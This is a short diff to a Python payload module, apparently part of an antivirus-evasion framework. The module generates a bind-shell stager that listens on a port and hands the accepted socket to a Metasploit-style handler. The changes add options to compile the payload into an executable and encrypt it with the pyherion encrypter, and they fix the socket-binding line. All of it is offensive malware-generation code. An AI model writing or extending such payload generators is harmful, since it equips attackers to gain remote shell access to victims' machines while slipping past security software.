@@ -21,6 +21,7 @@ class PayloadModule:
         self.cli_opts = cli_obj
         self.payload_source_code = ''
         self.language = "python"
+        self.extension = "py"
         if cli_obj.ordnance_payload is not None:
             self.payload_type = cli_obj.ordnance_payload
         elif cli_obj.msfvenom is not None:
@@ -31,8 +32,10 @@ class PayloadModule:
         # optional
         # options we require user interaction for- format is {OPTION : [Value, Description]]}
         self.required_options = {
+            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
             "RHOST"        : ["", "The listen target address"],
-            "LPORT"        : ["4444", "The listen port"]}
+            "LPORT"        : ["4444", "The listen port"],
+            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"]}
 
     def generate(self):
 
@@ -65,7 +68,7 @@ class PayloadModule:
         payload_code += "\t\tglobal %s\n" %(clientSocketName)
         # build the socket and connect to the handler
         payload_code += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
-        payload_code += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
+        payload_code += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0], str(self.required_options["LPORT"][0]))
         payload_code += "\t\t%s.listen(1)\n" % (socketName)
         payload_code += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
         # pack the underlying socket file descriptor into a c structure
